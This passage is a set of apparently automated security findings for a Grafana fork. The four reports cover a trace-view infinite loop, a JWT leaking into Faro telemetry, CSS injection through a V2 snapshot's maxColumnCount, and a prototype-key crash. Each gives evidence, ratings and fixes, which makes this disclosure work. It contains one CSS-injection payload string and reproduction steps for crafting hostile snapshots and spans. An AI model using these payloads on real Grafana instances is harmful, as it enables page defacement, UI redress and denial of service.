6. [data/plugins-bundled/jaeger/module.js.map](https://github.com/Halbarevi/grafanna/blob/b5926dce1d4e96c91966744d89cd016af3f44b27/data/plugins-bundled/jaeger/module.js.map) (whole file)
   Recovered responseTransform.ts toSpanRow: parentSpanID = first CHILD_OF reference; `references` = every backend reference with its refType, minus the one equal to parentSpanID. A Jaeger span with references [{CHILD_OF, <missing id>}, {FOLLOWS_FROM, <self or descendant>}] therefore passes through unchanged. In the shipped plugin this frontend transformer runs on the JSON-upload path (datasource.ts query()); trace-by-ID frames are produced by the compiled backend (super.query) and are assumed to carry the same `references` column, as the frontend transformer documents.
7. [data/plugins-bundled/tempo/module.js.map](https://github.com/Halbarevi/grafanna/blob/b5926dce1d4e96c91966744d89cd016af3f44b27/data/plugins-bundled/tempo/module.js.map) (whole file)
   Recovered resultTransformer.ts getReferences maps every OTLP span `link` {traceId, spanId, attributes} to a reference verbatim (no refType, no self/descendant check); transformFromOTLP writes `parentSpanID: span.parentSpanId || ''` and `references: getReferences(span)`. OTLP links are arbitrary producer-chosen pointers. For trace-by-ID queries the frame is built by the compiled backend and passed through transformTrace (`response.data[0]`) untouched; that the backend emits links as `references` is an assumption consistent with the frontend transformer. Any datasource plugin returning a trace frame reaches the same walker.

## Impact
No confidentiality or integrity effect. Availability: the Grafana frontend in the victim's browser is fully and deterministically hung (infinite loop plus unbounded array growth until out-of-memory) whenever the trace is displayed; a dashboard embedding the trace is unusable for every viewer until the span is removed from the backend. The Grafana server process is unaffected.

## Reproduction steps
1. Attacker position: a tracing datasource/upstream the victim's Grafana queries (threat-model adversary 4), or anyone able to emit spans into that backend (OTLP ingestion is typically unauthenticated inside a cluster). They store one span whose parentSpanId is absent from the trace and which carries a link/FOLLOWS_FROM reference to itself or to its own child. No Grafana privileges are needed. The victim merely opens the trace in Explore, follows a trace link from logs, or views a dashboard whose Traces panel shows it; render then loops forever. Requirement: the attacker's data must sit in a tracing backend configured as a datasource (privileged data-path position), hence AT:PRESENT.

## Recommended fix
1. spanAncestorIds follows the resolved-reference graph with an unbounded `while` loop, assuming it is a tree, although references come from the datasource and may contain self-references or back-references to descendants. Fix criteria: The ancestor walk must terminate for any reference graph: track visited span IDs or bound the walk by trace size / span.depth and stop when a span repeats. Verify by rendering a trace whose span has a missing parent and a FOLLOWS_FROM/link reference to itself or to its own child: the view must render without hanging.
2. transform-trace-data resolves `ref.span` for every reference whose target exists, so non-parent references (links, FOLLOWS_FROM to self or descendants) are indistinguishable from the real parent edge the tree builder used. Fix criteria: The parent relationship used for indentation/ancestry should derive from the acyclic tree (references[0] / childSpanIds) rather than from the first resolvable reference, or references that are not the tree parent must be excluded from ancestor walks. Verify that a span's rendered ancestor chain equals its tree path even when it carries self/descendant references.

---
**Severity:** MEDIUM
**Status:** Open
**Category:** Infinite loop
**CWE:** [CWE-835](https://cwe.mitre.org/data/definitions/835.html)
**Attack vector:** NETWORK
**Attack complexity:** LOW
**Attack requirements:** PRESENT
**Privileges required:** NONE
**User interaction:** PASSIVE
**Vulnerable system confidentiality impact:** NONE
**Vulnerable system integrity impact:** NONE
**Vulnerable system availability impact:** HIGH
**Subsequent system confidentiality impact:** NONE
**Subsequent system integrity impact:** NONE
**Subsequent system availability impact:** NONE
**Repository:** Halbarevi/grafanna
**Branch:** main
**Commit:** b5926dce1d4e96c91966744d89cd016af3f44b27
**Date created:** 2026-10-18
**Finding URL:** https://claude.ai/security?project=scanproj_019iXQSLyZoKTnm63UmVYEHf&finding=scan_012mSAEzQmHjt1JiL4MG5bXM-5256252

---

# URL-login auth_token persists in window.location.href and is exported as Faro page.url to the configured telemetry collector

## Details
With `[auth.jwt] url_login = true`, users authenticate by opening a URL of the documented form `/d/<uid>?orgId=1&kiosk&auth_token=<JWT>`. The frontend reads the token (`loadUrlToken`, attached as the JWT header on every backendSrv request) but never removes it from the browser location: `handleRedirectTo` returns early when `auth_token` is present without calling `history.replaceState` (unlike its handling of `redirectTo`), `urlToken.ts` only reads and caches it, and the dashboard slug-normalization rewrite in `DashboardScenePageStateManager` deliberately spreads the current location to keep search params. The bearer credential therefore stays in `window.location.href` for the whole dashboard view.

When the Faro frontend-observability backend is enabled (`[log.frontend] enabled = true`), `faroPageMeta.applyPageMeta()` calls `faro.api.setPage({ url: window.location.href })` on load and on every history event, so `meta.page.url` on every Faro log/error/measurement/trace batch contains the JWT. `GrafanaJavascriptAgentBackend` ships those batches via `FetchTransport` to `[log.frontend] custom_endpoint` (e.g. a Grafana Cloud Frontend Observability collector or any operator-chosen receiver, with `api_key`); the only `beforeSend` hook is a bot filter and performs no redaction.

The finding holds when `custom_endpoint` points at an external collector: every URL-login user's session JWT is exported to a party outside Grafana's authorization model, and anyone who can read that telemetry store (vendor staff, other tenants with access to the Loki/Faro data, or a compromised collector) can replay the token via `?auth_token=` or the JWT header against Grafana until it expires. With the default `custom_endpoint = /log-grafana-javascript-agent` the signals go to the Grafana server's own stdout, which the url_login docs already concede ('can lead to JWTs being exposed in logs'); that default case adds nothing. The project evidently regards the token as sensitive (`ShareModal/utils.ts` strips `auth_token` from share links; session replay masks all inputs and text), so export to the telemetry collector is not intended behaviour.

Not established from this repository's code and stated only as assumptions: the GA/GA4/Rudderstack/PostHog Echo backends do not read `meta.url` themselves, so any page-URL capture by those third-party SDKs is SDK default behaviour at the versions loaded, not something this code does. The `Echo.getMeta()` url field is built but no backend in this tree forwards it externally. Referer leakage cross-origin is mitigated by browsers' default `strict-origin-when-cross-origin` policy and is not relied upon here.

## Evidence
1. [public/app/core/services/echo/backends/grafana-javascript-agent/faroPageMeta.ts:58–77](https://github.com/Halbarevi/grafanna/blob/b5926dce1d4e96c91966744d89cd016af3f44b27/public/app/core/services/echo/backends/grafana-javascript-agent/faroPageMeta.ts#L58-L77)
   applyPageMeta() calls faro.api.setPage({ url: window.location.href, attributes }) (line 73) on the landing page (line 77) and again on every history event (line 92). The full href, including the auth_token query parameter, becomes meta.page.url on every Faro signal; nothing redacts or strips the query string before it is set.
2. [public/app/core/utils/urlToken.ts:3–13](https://github.com/Halbarevi/grafanna/blob/b5926dce1d4e96c91966744d89cd016af3f44b27/public/app/core/utils/urlToken.ts#L3-L13)
   loadUrlToken() reads auth_token from window.location.search and caches it (so later SPA navigations that drop the parameter still work), but never rewrites the location to remove the credential after consuming it.
3. [public/app/core/navigation/handleRedirectTo.ts:8–15](https://github.com/Halbarevi/grafanna/blob/b5926dce1d4e96c91966744d89cd016af3f44b27/public/app/core/navigation/handleRedirectTo.ts#L8-L15)
   The only boot-time code that inspects auth_token returns early without touching the URL; contrast lines 20-21 where redirectTo is deleted from the query and history.replaceState() is called. No other file under public/app (non-test) removes auth_token from the location.
4. [public/app/core/services/echo/backends/grafana-javascript-agent/GrafanaJavascriptAgentBackend.ts:60–74](https://github.com/Halbarevi/grafanna/blob/b5926dce1d4e96c91966744d89cd016af3f44b27/public/app/core/services/echo/backends/grafana-javascript-agent/GrafanaJavascriptAgentBackend.ts#L60-L74)
   When options.customEndpoint is configured (and the page is not a cross-origin iframe) a FetchTransport posts every Faro transport item, with its meta (including page.url), to that endpoint with the configured apiKey. setupFaroPageMeta() is wired at line 123.
5. [public/app/core/services/echo/backends/grafana-javascript-agent/beforeSendHandler.ts:31–54](https://github.com/Halbarevi/grafanna/blob/b5926dce1d4e96c91966744d89cd016af3f44b27/public/app/core/services/echo/backends/grafana-javascript-agent/beforeSendHandler.ts#L31-L54)
   The only beforeSend hook on the Faro pipeline filters bot user agents; it performs no redaction of item.meta.page.url, so the token reaches the transport unmodified.
6. [public/app/features/dashboard-scene/pages/DashboardScenePageStateManager.ts:906–913](https://github.com/Halbarevi/grafanna/blob/b5926dce1d4e96c91966744d89cd016af3f44b27/public/app/features/dashboard-scene/pages/DashboardScenePageStateManager.ts#L906-L913)
   The slug-normalization rewrite after a dashboard loads spreads the current location 'to persist search params', so in the documented URL-login case (/d/<uid>?orgId=1&kiosk&auth_token=...) the token remains in the address bar for the lifetime of the dashboard view and is re-emitted by faroPageMeta on the REPLACE event.
7. [public/app/core/services/echo/init.ts:86–119](https://github.com/Halbarevi/grafanna/blob/b5926dce1d4e96c91966744d89cd016af3f44b27/public/app/core/services/echo/init.ts#L86-L119)
   initFaroBackend() registers the GrafanaJavascriptAgentBackend whenever config.grafanaJavascriptAgent.enabled ([log.frontend] enabled = true) and passes config.grafanaJavascriptAgent.customEndpoint ([log.frontend] custom_endpoint) as the transport destination.
8. [public/app/features/dashboard/components/ShareModal/utils.ts:54–56](https://github.com/Halbarevi/grafanna/blob/b5926dce1d4e96c91966744d89cd016af3f44b27/public/app/features/dashboard/components/ShareModal/utils.ts#L54-L56)
   The project itself treats the URL-login token as a per-identity secret that must not leave the browser via URLs ('Token is unique to the authenticated identity and should not be shared with the URL'), establishing that exporting it to a telemetry collector is not conceded behaviour.

## Impact
The exported value is the user's complete authentication credential; replaying it grants the victim's full read access to Grafana (VC:H). Writes are possible to the extent of the victim's role, but the documented URL-login use case is embedded/kiosk viewing and the token is time-bounded, so integrity is rated LOW; no availability impact.

## Reproduction steps
1. Deployment conditions (AT:P): url_login enabled and the Faro backend enabled with custom_endpoint pointing at an external collector; both are supported, documented configurations, not disabled controls. Given those, the leak occurs automatically for every user who opens a URL-login link and keeps the dashboard open (routine, UI:P). The recipient needs no Grafana privileges (PR:N); they need read access to the telemetry data, a position outside Grafana's authorization model. No protection must be bypassed: the only beforeSend hook is a bot filter.

## Recommended fix
1. The auth_token query parameter is consumed by the frontend but never removed from the browser location, so the credential persists in window.location.href for the lifetime of the page and is picked up by any component that reports the page URL. Fix criteria: After the token is read on boot and cached, the frontend removes auth_token from the address bar (history.replaceState without the parameter) before any Echo/Faro/analytics backend initialises, with the cached token remaining the only copy (or a documented alternative that keeps reload working without leaving the token in the URL). Verify by loading ?auth_token=X with Faro enabled: no transport payload or document URL contains X.
2. Faro page metadata is built from the raw window.location.href without redacting credential-bearing query parameters. Fix criteria: faroPageMeta.applyPageMeta (and any other page-URL reporter such as Echo.getMeta) redacts or strips auth_token and similar credential parameters before setting page.url, so a URL that still contains a token yields telemetry without it; a beforeSend/redaction step on the Faro pipeline covers signals that embed the URL elsewhere.

---
**Severity:** MEDIUM
**Status:** Open
**Category:** Information exposure
**CWE:** [CWE-201](https://cwe.mitre.org/data/definitions/201.html)
**Attack vector:** NETWORK
**Attack complexity:** LOW
**Attack requirements:** PRESENT
**Privileges required:** NONE
**User interaction:** PASSIVE
**Vulnerable system confidentiality impact:** HIGH
**Vulnerable system integrity impact:** LOW
**Vulnerable system availability impact:** NONE
**Subsequent system confidentiality impact:** NONE
**Subsequent system integrity impact:** NONE
**Subsequent system availability impact:** NONE
**Repository:** Halbarevi/grafanna
**Branch:** main
**Commit:** b5926dce1d4e96c91966744d89cd016af3f44b27
**Date created:** 2026-10-18
**Finding URL:** https://claude.ai/security?project=scanproj_019iXQSLyZoKTnm63UmVYEHf&finding=scan_012mSAEzQmHjt1JiL4MG5bXM-5256204

---

# V2 AutoGridLayout maxColumnCount interpolated raw into emotion stylesheet gives snapshot authors document-wide CSS

## Details
The auto-grid layout of V2 dashboards builds its CSS grid-template-columns value with getTemplateColumnsTemplate(maxColumnCount, columnWidth) (AutoGridLayoutManager.tsx:477-479), which template-literal-interpolates maxColumnCount with no type, range or character check; columnWidth is the only operand normalised (getNamedColumWidthInPixels returns a number or a fixed default), so maxColumnCount is the sole injection point. deserializeAutoGridLayout (AutoGridLayoutSerializer.ts:120-136) takes maxColumnCount verbatim from layout.spec; `?? defaults.maxColumnCount` only replaces null/undefined, so a JSON string survives into both AutoGridLayoutManager state and the templateColumns string. AutoGridLayoutRenderer.tsx:84 then writes that string into an emotion css({ gridTemplateColumns: state.templateColumns, ... }) object. Recovered @emotion/serialize (public/build/7606.*.js.map) emits `grid-template-columns:` + value + `;` with no escaping, and stylis consumes balanced parentheses verbatim (Tokenizer delimit/delimiter) and ends the rule block at `}` (Parser case 125), with emotion's rulesheet inserting every resulting root-level rule into the document stylesheet. A value such as `1))))}body{display:none}x{a:b` therefore closes the four open parentheses of the template, terminates the generated .css-xxx rule, and makes `body{display:none}` (or overlays via position:fixed/::before content, attribute-selector url() beacons, etc.) a top-level rule in the victim's authenticated Grafana document; emotion never removes inserted rules, so they persist across SPA navigation for the life of the page.

Reachability. The confirmed stored path is the dashboard snapshot: POST /api/snapshots accepts `dashboard` as Unstructured JSON (public/api-merged.json:14202-14213, doc api-legacy/snapshot.md requires only authentication) and GET /api/snapshots/{key} returns it as-is. DashboardScenePageStateManagerV2.loadSnapshotScene (DashboardScenePageStateManager.ts:1020-1030) → DashboardLoaderSrvV2.loadSnapshot (DashboardLoaderSrv.ts:267-278) → ensureV2Response (ResponseTransformers.ts:157-167), which returns dto.dashboard verbatim as spec whenever it has an `elements` key, → transformSaveModelSchemaV2ToScene → layoutDeserializerRegistry → deserializeAutoGridLayout. This runs regardless of the dashboardNewLayouts toggle: the v1 manager throws DashboardVersionError for any snapshot body that is a v2 spec (664-679) and the unified manager falls back to the v2 manager (1470-1478). Route /dashboard/:type/:slug is allowAnonymous for type=snapshot (routes.tsx:108-109); the UI itself creates v2 snapshots through this same endpoint (ShareSnapshotTab.tsx:150-163), so the path is production. The Editor-only sanctioned grant is cssfilter-whitelisted `style=` attributes scoped to the Editor's own elements; this yields unscoped selectors and unrestricted properties over the whole page, the same class as the verified sanitizedsvg-inline-style-css-injection finding.

The originally filed route (saving a V2 dashboard with a string maxColumnCount through Settings > JSON Model or the dashboard.grafana.app v2 API) is conditional: the JSON Model editor disables Save on JSON-schema validation errors for v2 (JsonModelEditView.tsx:336), and that schema is fetched from the server's typed OpenAPI document (dashboardSchemaFetcher.ts, /openapi/v3/apis/dashboard.grafana.app/<v2>), which indicates a typed Go spec whose decoder would reject a string; the Go server is absent from this checkout, so that route holds only if the apiserver stores the spec untyped. The in-UI numeric control (onMaxColumnCountChanged) always produces numbers, which is why the defect was not noticed. Script execution is not reachable (CSS only).

## Evidence
1. [public/app/features/dashboard-scene/scene/layout-auto-grid/AutoGridLayoutManager.tsx:477–479](https://github.com/Halbarevi/grafanna/blob/b5926dce1d4e96c91966744d89cd016af3f44b27/public/app/features/dashboard-scene/scene/layout-auto-grid/AutoGridLayoutManager.tsx#L477-L479)
   getTemplateColumnsTemplate interpolates maxColumnCount into the grid-template-columns string with no coercion or validation; only columnWidth is normalised by getNamedColumWidthInPixels. This is the code the fix must change.
2. [public/app/features/dashboard-scene/scene/layout-auto-grid/AutoGridLayoutRenderer.tsx:80–87](https://github.com/Halbarevi/grafanna/blob/b5926dce1d4e96c91966744d89cd016af3f44b27/public/app/features/dashboard-scene/scene/layout-auto-grid/AutoGridLayoutRenderer.tsx#L80-L87)
   The string is placed into an emotion css({ gridTemplateColumns: state.templateColumns }) object (line 84), i.e. serialised into a document stylesheet rule rather than a React inline style; recovered @emotion/serialize emits it unescaped and stylis ends the rule at the first `}` outside balanced parentheses, so trailing text becomes top-level CSS rules.
3. [public/app/features/dashboard-scene/serialization/layoutSerializers/AutoGridLayoutSerializer.ts:119–138](https://github.com/Halbarevi/grafanna/blob/b5926dce1d4e96c91966744d89cd016af3f44b27/public/app/features/dashboard-scene/serialization/layoutSerializers/AutoGridLayoutSerializer.ts#L119-L138)
   deserializeAutoGridLayout reads maxColumnCount straight from layout.spec (line 120) and passes it to getTemplateColumnsTemplate (133-136) and into manager state (128); `?? defaults.maxColumnCount` substitutes only null/undefined, so a string from the stored JSON survives.
4. [public/app/features/dashboard-scene/pages/DashboardScenePageStateManager.ts:1020–1030](https://github.com/Halbarevi/grafanna/blob/b5926dce1d4e96c91966744d89cd016af3f44b27/public/app/features/dashboard-scene/pages/DashboardScenePageStateManager.ts#L1020-L1030)
   DashboardScenePageStateManagerV2.loadSnapshotScene loads the snapshot body, runs ensureV2Response and hands the result to transformSaveModelSchemaV2ToScene, which dispatches layout.kind through layoutDeserializerRegistry to deserializeAutoGridLayout — the stored-snapshot route to the sink.
5. [public/app/features/dashboard/api/ResponseTransformers.ts:157–167](https://github.com/Halbarevi/grafanna/blob/b5926dce1d4e96c91966744d89cd016af3f44b27/public/app/features/dashboard/api/ResponseTransformers.ts#L157-L167)
   ensureV2Response returns dto.dashboard verbatim as `spec` whenever the legacy-API body has an `elements` key (isDashboardV2Spec); no schema validation is applied to the snapshot blob before it reaches the layout deserializers.
6. [public/app/features/dashboard/services/DashboardLoaderSrv.ts:267–278](https://github.com/Halbarevi/grafanna/blob/b5926dce1d4e96c91966744d89cd016af3f44b27/public/app/features/dashboard/services/DashboardLoaderSrv.ts#L267-L278)
   DashboardLoaderSrvV2.loadSnapshot fetches the snapshot through getDashboardSnapshotSrv().getSnapshot (GET /api/snapshots/<key>) and pipes it through ensureV2Response.
7. [public/app/features/dashboard-scene/pages/DashboardScenePageStateManager.ts:664–679](https://github.com/Halbarevi/grafanna/blob/b5926dce1d4e96c91966744d89cd016af3f44b27/public/app/features/dashboard-scene/pages/DashboardScenePageStateManager.ts#L664-L679)
   The v1 manager's loadSnapshotScene throws DashboardVersionError('v2beta1') whenever the snapshot body is a v2 spec instead of rendering it with the forced v1 layout, so v2 snapshot bodies always reach the v2 manager.
8. [public/app/features/dashboard-scene/pages/DashboardScenePageStateManager.ts:1470–1478](https://github.com/Halbarevi/grafanna/blob/b5926dce1d4e96c91966744d89cd016af3f44b27/public/app/features/dashboard-scene/pages/DashboardScenePageStateManager.ts#L1470-L1478)
   The unified manager catches that DashboardVersionError and calls v2Manager.loadSnapshotScene, so the v2 snapshot path is taken independently of the dashboardNewLayouts feature toggle.
9. [public/app/features/dashboard/services/SnapshotSrv.ts:54–69](https://github.com/Halbarevi/grafanna/blob/b5926dce1d4e96c91966744d89cd016af3f44b27/public/app/features/dashboard/services/SnapshotSrv.ts#L54-L69)
   Legacy snapshot service: create POSTs the caller-supplied dashboard JSON to /api/snapshots; getSnapshot GETs /api/snapshots/<key> and returns the stored body unchanged apart from meta.canShare.
10. [public/api-merged.json:14202–14213](https://github.com/Halbarevi/grafanna/blob/b5926dce1d4e96c91966744d89cd016af3f44b27/public/api-merged.json#L14202-L14213)
   Backend evidence available in the checkout: CreateDashboardSnapshotCommand.dashboard is typed Unstructured, so the server stores an arbitrary JSON document (a string maxColumnCount included) rather than a typed v2 spec.
11. [public/app/routes/routes.tsx:107–109](https://github.com/Halbarevi/grafanna/blob/b5926dce1d4e96c91966744d89cd016af3f44b27/public/app/routes/routes.tsx#L107-L109)
   /dashboard/:type/:slug is allowAnonymous for type=snapshot; DashboardScenePage calls stateManager.loadSnapshot(slug) for this route, so any user who opens the snapshot link renders the injected stylesheet in their own (authenticated) document.
12. [public/app/features/dashboard-scene/sharing/ShareSnapshotTab.tsx:150–163](https://github.com/Halbarevi/grafanna/blob/b5926dce1d4e96c91966744d89cd016af3f44b27/public/app/features/dashboard-scene/sharing/ShareSnapshotTab.tsx#L150-L163)
   The shipped UI creates V2 snapshots (transformSceneToSaveModelSchemaV2 with isSnapshot=true, including the AutoGridLayout spec) through the same POST /api/snapshots endpoint, establishing that v2 snapshot bodies are a production data shape, not an artificial one.
13. [public/app/features/dashboard-scene/settings/JsonModelEditView.tsx:336](https://github.com/Halbarevi/grafanna/blob/b5926dce1d4e96c91966744d89cd016af3f44b27/public/app/features/dashboard-scene/settings/JsonModelEditView.tsx#L336)
   For the originally filed dashboard-store route: the JSON Model editor disables Save on schema validation errors for v2 dashboards (schema fetched from the server's typed OpenAPI document by dashboardSchemaFetcher.ts). This is a client-side gate only; whether the absent Go apiserver also rejects a string maxColumnCount cannot be settled here, so that route is conditional and the snapshot route above is the confirmed one.

## Impact
Unscoped, unrestricted CSS in the victim's authenticated document: attribute-selector/url() exfiltration of attribute values and presence beacons on any page visited afterwards (low confidentiality), and hiding or overlaying UI to redress clicks or show fake content (low integrity). No script execution; no availability impact beyond cosmetic.

## Reproduction steps
1. Any signed-in user allowed to create snapshots (Editors at minimum; docs require only authentication) POSTs to /api/snapshots a v2 dashboard body whose layout is an AutoGridLayout with maxColumnCount set to a string that balances the template's four parentheses, closes the rule with `}` and appends arbitrary CSS rules. The server stores it as Unstructured JSON. Any user who opens /dashboard/snapshot/<key> (e.g. an Admin browsing the snapshots list) has the rules inserted into their authenticated page's stylesheet, where they persist across SPA navigation. Default configuration (snapshots enabled, CSP off); no toggle dependency.

## Recommended fix
1. getTemplateColumnsTemplate interpolates the stored maxColumnCount into a CSS string without coercing or validating it, and deserializeAutoGridLayout accepts any JSON value for it. Fix criteria: maxColumnCount (and any other layout value that reaches a CSS string) is coerced to a bounded positive integer at deserialisation and again before CSS construction; a spec with a non-numeric maxColumnCount renders with the default column count and no character from the stored value appears in the generated stylesheet.
2. Snapshot bodies (and other legacy-API dashboard payloads) with a v2 shape are handed to the v2 scene builders by ensureV2Response without schema validation, although the backend stores them as untyped JSON. Fix criteria: V2 specs obtained from untyped sources (snapshots, public dashboards, imported/applied JSON) are validated against the v2 schema (e.g. the existing dashboardV2SpecSchema) before deserialisation, and invalid layout fields are replaced by defaults rather than passed through.

---
**Severity:** LOW
**Status:** Open
**Category:** CSS injection
**CWE:** [CWE-79](https://cwe.mitre.org/data/definitions/79.html)
**Attack vector:** NETWORK
**Attack complexity:** LOW
**Attack requirements:** NONE
**Privileges required:** LOW
**User interaction:** PASSIVE
**Vulnerable system confidentiality impact:** LOW
**Vulnerable system integrity impact:** LOW
**Vulnerable system availability impact:** NONE
**Subsequent system confidentiality impact:** NONE
**Subsequent system integrity impact:** NONE
**Subsequent system availability impact:** NONE
**Repository:** Halbarevi/grafanna
**Branch:** main
**Commit:** b5926dce1d4e96c91966744d89cd016af3f44b27
**Date created:** 2026-10-18
**Finding URL:** https://claude.ai/security?project=scanproj_019iXQSLyZoKTnm63UmVYEHf&finding=scan_012mSAEzQmHjt1JiL4MG5bXM-5256420

---

# Span attribute key named constructor or __proto__ throws in SpanDetail, breaking the trace view

## Details
SpanDetail (SpanDetail/index.tsx) builds the plugin-extension context for resource/span attributes by reducing `process.tags` and `span.tags` into plain `{}` objects keyed by the attribute name (lines 78-93): `if (acc[tag.key]) { acc[tag.key].push(v) } else { acc[tag.key] = [v] }`. The membership test is a truthiness read on a plain object, so an attribute key that names an Object.prototype member — `constructor`, `__proto__`, `toString`, `valueOf`, `hasOwnProperty`, `isPrototypeOf`, `toLocaleString`, `propertyIsEnumerable`, `__defineGetter__`, … — resolves to the inherited function/object, the test passes, and `.push` is not a function: a TypeError is thrown synchronously inside the `useMemo` during React render.

Attribute names are chosen by the span producer (OTLP/Jaeger attribute keys are arbitrary strings) and reach this code unchanged: `transformTraceDataFrame` copies the frame's `serviceTags` into `process.tags` and spreads the row's `tags` (utils/transform.ts:30-36), and `transformTraceData` only de-duplicates and sorts them (transform-trace-data.tsx:169, 229-243; `orderTags` lower-cases keys for sorting only). No allow-list or own-property check exists between the frame and SpanDetail. The hook is called unconditionally by SpanDetail (index.tsx:455-464), which mounts when the span's detail row is rendered: only when the user clicks the span row (SpanBarRow.tsx:501 → toggleDetail, useDetailState.ts:20-25 → detailStates; VirtualizedTraceView.tsx:385, 560-562). A focused span (URL/trace-link spanId) is only scrolled to and highlighted (VirtualizedTraceView.tsx:237-264), not expanded, so the trigger is the victim inspecting the poisoned span — or, when the key is a resource attribute (`serviceTags`), any span of the attacker's service.

The exception is caught by the nearest boundary: in Explore the `ErrorBoundaryAlert boundaryName="explore-trace-view-panel"` (Explore.tsx:797-801), which is rendered without `dependencies`, so the whole trace view — every service's spans, header, timeline — is replaced by an error alert that persists until the Explore pane remounts; in dashboards and the log-line trace embed (LogLineDetailsTrace.tsx:104, no boundary of its own) the enclosing scenes panel boundary. A `__proto__` key does not pollute Object.prototype here: the truthy branch throws before any assignment.

Attacker and gain: a span producer emits one span (or a resource attribute shared by all its spans) with an attribute named `constructor`; this is accepted telemetry, no Grafana privileges are needed. The gain is the ability to destroy the trace view — hiding other services' spans in the same trace — for every Grafana user who inspects the attacker's span, until they reload; a position the project does not otherwise concede the ability to break rendering (a datasource may return an error, a span producer may not). Impact is availability only and modest.

Assumption: the Tempo/Jaeger Go backends (not in checkout) preserve attribute keys verbatim in the `tags`/`serviceTags` other-typed fields, as the frontend transforms recovered from the bundled plugins do (jaeger responseTransform.ts:54-59 copies `span.tags`/process tags verbatim; tempo resultTransformer.ts:112 pushes `{ key: attribute.key, … }`).

## Evidence
1. [public/app/features/explore/TraceView/components/TraceTimelineViewer/SpanDetail/index.tsx:77–94](https://github.com/Halbarevi/grafanna/blob/b5926dce1d4e96c91966744d89cd016af3f44b27/public/app/features/explore/TraceView/components/TraceTimelineViewer/SpanDetail/index.tsx#L77-L94)
   Primary location — the code the fix must change. useResourceAttributesExtensionLinks reduces process.tags and span tags into plain `{}` objects keyed by tag.key with a truthiness membership test: `if (acc[tag.key]) { acc[tag.key].push(tag.value) } else { acc[tag.key] = [tag.value] }`. For a key inherited from Object.prototype (`constructor`, `__proto__`, `toString`, `hasOwnProperty`, `valueOf`, …) `acc[tag.key]` is a truthy function/object without `.push`, so a TypeError is thrown synchronously inside the useMemo during render.
2. [public/app/features/explore/TraceView/components/TraceTimelineViewer/SpanDetail/index.tsx:455–463](https://github.com/Halbarevi/grafanna/blob/b5926dce1d4e96c91966744d89cd016af3f44b27/public/app/features/explore/TraceView/components/TraceTimelineViewer/SpanDetail/index.tsx#L455-L463)
   SpanDetail calls the hook unconditionally with `process` and `spanTags: tags` (span.tags) on every render, so the throw happens as soon as the span's detail row mounts.
3. [public/app/features/explore/TraceView/components/TraceTimelineViewer/VirtualizedTraceView.tsx:385](https://github.com/Halbarevi/grafanna/blob/b5926dce1d4e96c91966744d89cd016af3f44b27/public/app/features/explore/TraceView/components/TraceTimelineViewer/VirtualizedTraceView.tsx#L385)
   A span's detail row (renderSpanDetailRow → SpanDetailRow → SpanDetail) is rendered when `detailStates` holds the span (lines 560-562). focusedSpanId only scrolls/highlights (lines 237-264), so expansion happens only through the user's click on the span row (SpanBarRow.tsx:501 → onDetailToggled → useDetailState.toggleDetail).
4. [public/app/features/explore/TraceView/useDetailState.ts:12–29](https://github.com/Halbarevi/grafanna/blob/b5926dce1d4e96c91966744d89cd016af3f44b27/public/app/features/explore/TraceView/useDetailState.ts#L12-L29)
   detailStates is local component state populated only by toggleDetail (the click handler); it is cleared when a new frame arrives. This fixes the trigger as the victim expanding the poisoned span (or any span of a service whose resource attributes carry the key).
5. [public/app/features/explore/TraceView/components/model/transform-trace-data.tsx:229–242](https://github.com/Halbarevi/grafanna/blob/b5926dce1d4e96c91966744d89cd016af3f44b27/public/app/features/explore/TraceView/components/model/transform-trace-data.tsx#L229-L242)
   Span tags are only normalised with asTagArray/deduplicateTags/orderTags; keys pass through unchanged (orderTags lower-cases only for sorting). process.tags likewise (line 169). No key allow-list or own-property check exists between the frame and SpanDetail.
6. [public/app/features/explore/TraceView/utils/transform.ts:30–35](https://github.com/Halbarevi/grafanna/blob/b5926dce1d4e96c91966744d89cd016af3f44b27/public/app/features/explore/TraceView/utils/transform.ts#L30-L35)
   Source: span.process.tags come verbatim from the `serviceTags` column and span.tags from the `tags` column of the trace frame (FieldType.other) — the OTLP/Jaeger attribute keys emitted by the span producer and framed by the Tempo/Jaeger datasource.
7. [public/app/features/explore/Explore.tsx:797–800](https://github.com/Halbarevi/grafanna/blob/b5926dce1d4e96c91966744d89cd016af3f44b27/public/app/features/explore/Explore.tsx#L797-L800)
   The TypeError propagates to ErrorBoundaryAlert 'explore-trace-view-panel', which is rendered without a `dependencies` prop, so (per the recovered @grafana/ui ErrorBoundary, which resets only on dependency change) the whole trace view — all services' spans, not just the expanded one — stays replaced by an error alert until the pane remounts; the rest of Grafana keeps working. Dashboards/log-line embeds fall to the scenes panel boundary.

## Impact
No confidentiality or integrity effect; the __proto__ path throws before any prototype write. Availability: once the poisoned span is expanded, the Explore trace view (ErrorBoundaryAlert without dependencies) or the dashboard panel is replaced by an error alert, hiding every service's spans in that trace until the pane is remounted/reloaded; the rest of Explore/the dashboard keeps working and the user can avoid the span afterwards, so the loss is a recoverable denial of one trace's visibility (LOW).

## Reproduction steps
1. A span producer emits a span (or resource) attribute whose key is `constructor` or another Object.prototype member name under any trace ID it participates in; the tracing backend stores it as ordinary telemetry (assumption: Tempo/Jaeger backends preserve keys verbatim, as the bundled plugins' frontend transforms do). No Grafana privileges and no defence to bypass, default configuration. The victim must open the trace in Explore, a Traces panel or log-line details and click the poisoned span (or any span of the poisoned service) to expand it — a specific, conscious interaction with the attacker's payload, since focused-span links only scroll and nothing auto-expands — so user interaction is ACTIVE. The reducer then throws deterministically on every attempt.

## Recommended fix
Untrusted span/resource attribute names are used as keys of a plain object with a truthiness check, so inherited Object.prototype members are mistaken for existing entries and dereferenced as arrays. Fix criteria: Attribute grouping must not be affected by Object.prototype members: use a Map or a null-prototype object (or an own-property check) when keying by tag.key, in useResourceAttributesExtensionLinks and any sibling that keys plain objects by attribute names. Verify by expanding a span whose tags include keys `constructor`, `__proto__` and `toString`: the span detail must render and Object.prototype must be unchanged.

---
**Severity:** LOW
**Status:** Open
**Category:** Improper input validation
**CWE:** [CWE-754](https://cwe.mitre.org/data/definitions/754.html)
**Attack vector:** NETWORK
**Attack complexity:** LOW
**Attack requirements:** NONE
**Privileges required:** NONE
**User interaction:** ACTIVE
**Vulnerable system confidentiality impact:** NONE
**Vulnerable system integrity impact:** NONE
**Vulnerable system availability impact:** LOW
**Subsequent system confidentiality impact:** NONE
**Subsequent system integrity impact:** NONE
**Subsequent system availability impact:** NONE
**Repository:** Halbarevi/grafanna
**Branch:** main
**Commit:** b5926dce1d4e96c91966744d89cd016af3f44b27
**Date created:** 2026-10-18
